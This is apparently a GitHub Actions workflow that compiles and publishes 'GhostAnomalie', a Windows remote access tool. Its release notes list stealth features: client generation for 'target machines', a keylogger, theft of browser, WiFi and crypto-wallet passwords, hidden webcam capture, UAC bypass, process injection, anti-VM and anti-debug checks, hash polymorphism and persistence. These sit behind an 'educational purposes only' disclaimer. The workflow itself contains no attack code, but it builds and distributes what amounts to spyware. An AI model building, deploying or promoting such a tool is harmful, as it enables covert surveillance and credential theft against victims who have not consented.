name: 🚀 Build & Release Ghost Anomalie

on:
  push:
    tags:
      - 'v*'  # Déclenché quand tu pousses un tag comme v1.0.0, v2.0.0, etc.
  workflow_dispatch:  # Permet de lancer manuellement depuis l'interface GitHub

env:
  APP_NAME: GhostAnomalie
  PYTHON_VERSION: '3.10'

jobs:
  build:
    name: 🔧 Build GhostAnomalie.exe
    runs-on: windows-latest  # Windows obligatoire pour compiler un EXE
    
    steps:
      # ===== 1. Récupérer le code =====
      - name: 📥 Checkout code
        uses: actions/checkout@v4
        with:
          fetch-depth: 0
      
      # ===== 2. Installer Python =====
      - name: 🐍 Setup Python ${{ env.PYTHON_VERSION }}
        uses: actions/setup-python@v5
        with:
          python-version: ${{ env.PYTHON_VERSION }}
          cache: 'pip'
      
      # ===== 3. Installer les dépendances =====
      - name: 📦 Install dependencies
        run: |
          python -m pip install --upgrade pip
          pip install -r requirements.txt
          pip install pyinstaller pillow opencv-python pyaudio pywin32 psutil wmi cryptography
      
      # ===== 4. Créer l'icône (si elle n'existe pas) =====
      - name: 🎨 Generate icon
        run: |
          python -c "
          from PIL import Image, ImageDraw
          img = Image.new('RGBA', (256, 256), color=(0,0,0,0))
          draw = ImageDraw.Draw(img)
          draw.ellipse((40,40,216,200), fill=(0,255,136,200))
          draw.ellipse((70,100,110,140), fill=(5,5,15,255))
          draw.ellipse((146,100,186,140), fill=(5,5,15,255))
          draw.arc((90,140,166,180), start=0, end=180, fill=(5,5,15,255), width=10)
          img.save('ghost.ico', format='ICO', sizes=[(256,256)])
          print('✅ Icon generated')
          "
      
      # ===== 5. Compiler avec PyInstaller =====
      - name: 🔧 Build EXE with PyInstaller
        run: |
          pyinstaller --onefile --windowed --name "${{ env.APP_NAME }}" --clean --log-level WARN --hidden-import PIL --hidden-import PIL.ImageGrab --hidden-import cv2 --hidden-import pyaudio --hidden-import wave --hidden-import win32api --hidden-import win32con --hidden-import win32gui --hidden-import win32process --hidden-import win32clipboard --hidden-import win32ui --hidden-import win32pdh --hidden-import win32security --hidden-import win32file --hidden-import win32event --hidden-import win32service --hidden-import win32serviceutil --hidden-import win32com.client --hidden-import wmi --hidden-import psutil --hidden-import cryptography --hidden-import cryptography.fernet --icon=ghost.ico ghost.py
      
      # ===== 6. Vérifier que l'EXE existe =====
      - name: ✅ Verify EXE exists
        run: |
          if (Test-Path "dist\${{ env.APP_NAME }}.exe") {
            $size = (Get-Item "dist\${{ env.APP_NAME }}.exe").Length / 1MB
            Write-Host "✅ EXE generated successfully! Size: $([math]::Round($size, 2)) MB"
          } else {
            Write-Host "❌ EXE not found!"
            exit 1
          }
      
      # ===== 7. Créer un ZIP avec tous les fichiers =====
      - name: 📦 Create ZIP package
        run: |
          mkdir release_package
          copy dist\${{ env.APP_NAME }}.exe release_package\
          copy README.md release_package\ 2>nul || echo "README.md not found"
          copy FRANÇAIS.md release_package\ 2>nul || echo "FRANÇAIS.md not found"
          copy SECURITY.md release_package\ 2>nul || echo "SECURITY.md not found"
          copy LICENSE release_package\ 2>nul || echo "LICENSE not found"
          Compress-Archive -Path release_package\* -DestinationPath "${{ env.APP_NAME }}_${{ github.ref_name }}.zip"
          echo "✅ ZIP created: ${{ env.APP_NAME }}_${{ github.ref_name }}.zip"
      
      # ===== 8. Uploader les artefacts =====
      - name: 📤 Upload artifacts
        uses: actions/upload-artifact@v4
        with:
          name: ${{ env.APP_NAME }}_${{ github.ref_name }}
          path: |
            dist\${{ env.APP_NAME }}.exe
            ${{ env.APP_NAME }}_${{ github.ref_name }}.zip
      
      # ===== 9. Créer la Release =====
      - name: 🚀 Create GitHub Release
        uses: softprops/action-gh-release@v1
        with:
          files: |
            dist\${{ env.APP_NAME }}.exe
            ${{ env.APP_NAME }}_${{ github.ref_name }}.zip
          draft: false
          prerelease: false
          generate_release_notes: false
          body: |
            # 👻 Ghost Anomalie ${{ github.ref_name }}
            
            > **⚠️ EDUCATIONAL PURPOSE ONLY - Use on your own devices or with explicit written consent.**
            
            ## 🚀 What's New
            - ✅ **92+ commands** - Full remote administration toolkit
            - ✅ **Client Generator** - Generate custom EXE with your IP/Port
            - ✅ **Stealth Installation** - Installs in 12 Windows system folders
            - ✅ **Modern Hacker Interface** - Dark theme with neon effects
            - ✅ **Persistence Options** - Registry, Scheduled Tasks, Startup folder
            - ✅ **Anti-VM / Anti-Debug** - Detect virtual environments and debuggers
            - ✅ **All-in-One** - Controller + Client generator in a single EXE
            - ✅ **Portable** - No installation required, just run the EXE
            
            ## 📦 Download
            | File | Size | Description |
            |------|------|-------------|
            | **GhostAnomalie.exe** | ~15-30 MB | Full application (controller + generator) |
            | **GhostAnomalie_${{ github.ref_name }}.zip** | ~20-35 MB | Full package with documentation |
            
            ## 🔧 Quick Start
            ```bash
            1. Download GhostAnomalie.exe
            2. Double-click to launch
            3. Configure IP, Port, and Password
            4. Click "START SERVER"
            5. Generate your client with "GENERATE CLIENT"
            6. Deploy the client to target machines
            7. Control them from the interface!
            ```
            
            ## ⚡ Features
            
            ### 🖥️ Remote Control
            - Real-time desktop streaming
            - Mouse & keyboard control
            - Application launcher (visible/hidden)
            - Multiple monitor support
            
            ### 🔐 Security Testing
            - Keylogger (keyboard capture)
            - Password extraction (WiFi, Chrome)
            - Clipboard monitoring
            - Screen recording
            
            ### 📁 File Management
            - Full file browser
            - Upload/Download files
            - Search & filter
            - Archive support
            
            ### 🎥 Surveillance
            - Webcam access (with consent)
            - Microphone recording
            - File monitoring
            - Screen capture
            
            ### 🛡️ Stealth & Persistence
            - Process hiding
            - Multi-location installation
            - Registry persistence
            - Scheduled tasks
            - Startup folder
            - Anti-VM detection
            - Anti-Debug protection
            - Polymorphism (change file hash)
            
            ### 🌐 Network Tools
            - Network scanner
            - Port scanner
            - ARP scanner
            - WiFi list & connect
            - DNS flush
            
            ## 📋 Commands (92+)
            
            | Category | Commands |
            |----------|----------|
            | **System** | `screenshot`, `sysinfo`, `shutdown`, `restart`, `lock`, `logoff`, `hibernate` |
            | **Files** | `ls`, `cd`, `pwd`, `mkdir`, `rm`, `mv`, `download`, `upload` |
            | **Mouse** | `souris_move`, `souris_click`, `souris_scroll`, `souris_glisser` |
            | **Keyboard** | `clavier_texte`, `clavier_touche` |
            | **Camera** | `camera_start`, `camera_stop`, `camera_photo`, `camera_stealth` |
            | **Microphone** | `micro_start`, `micro_stop`, `micro_record` |
            | **Keylogger** | `keylogger_start`, `keylogger_stop`, `keylogger_export` |
            | **Passwords** | `pass_wifi`, `pass_chrome`, `pass_firefox`, `pass_all`, `crypto_wallets` |
            | **Network** | `network_scan`, `port_scan`, `arp_scan`, `wifi_list`, `dns_flush` |
            | **Processes** | `processus_list`, `processus_kill`, `service_list`, `service_start`, `service_stop` |
            | **Apps** | `app_lancer`, `app_cacher_tout`, `app_montrer_tout`, `app_fenetres` |
            | **Stealth** | `hide`, `persist`, `uac_bypass`, `polymorph`, `inject`, `selfdestruct` |
            | **Fun** | `popup`, `speak`, `website`, `beep`, `cd_eject`, `volume_set`, `volume_mute` |
            
            > 💡 **Full command list available in the README**
            
            ## ⚠️ Legal & Security
            
            ### ⚠️ IMPORTANT NOTICE
            
            **This software is for EDUCATIONAL PURPOSES ONLY.**
            
            By using this software, you agree to:
            
            1. ✅ Use only on systems you **OWN** or have **EXPLICIT WRITTEN PERMISSION** to test
            2. ✅ Use for **CYBERSECURITY LEARNING** and **RESEARCH**
            3. ✅ Use in **CTF COMPETITIONS** and **AUTHORIZED PENETRATION TESTS**
            4. ❌ **NEVER** use on devices without consent
            5. ❌ **NEVER** use for illegal activities (data theft, espionage, fraud, etc.)
            
            ### 📜 Legal Consequences
            
            | Country | Law | Penalty |
            |---------|-----|---------|
            | **USA** | CFAA | Up to 20 years, $250,000 |
            | **UK** | Computer Misuse Act | Up to 10 years |
            | **France** | Loi Godfrain | Up to 5 years, €300,000 |
            | **Gabon** | Loi N°001/2019 | Up to 10 years, 300,000,000 FCFA |
            
            ## 📚 Documentation
            
            - [README.md](https://github.com/${{ github.repository }}/blob/main/README.md) - Full documentation
            - [FRANÇAIS.md](https://github.com/${{ github.repository }}/blob/main/FRANÇAIS.md) - French version
            - [SECURITY.md](https://github.com/${{ github.repository }}/blob/main/SECURITY.md) - Security policy
            
            ## 🐛 Bug Reports & Feedback
            
            - Open an issue: [GitHub Issues](https://github.com/${{ github.repository }}/issues)
            - Discussions: [GitHub Discussions](https://github.com/${{ github.repository }}/discussions)
            
            ---
            
            **👻 Remember: With great power comes great responsibility. Use this knowledge to protect, not to harm.**
            
            *Made with ❤️ for the cybersecurity community*
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
      
      # ===== 10. Notification de fin =====
      - name: ✅ Build Complete
        run: |
          echo "🎉 Build complete!"
          echo "📦 EXE: dist/${{ env.APP_NAME }}.exe"
          echo "📦 ZIP: ${{ env.APP_NAME }}_${{ github.ref_name }}.zip"
          echo "🚀 Release: https://github.com/${{ github.repository }}/releases/tag/${{ github.ref_name }}"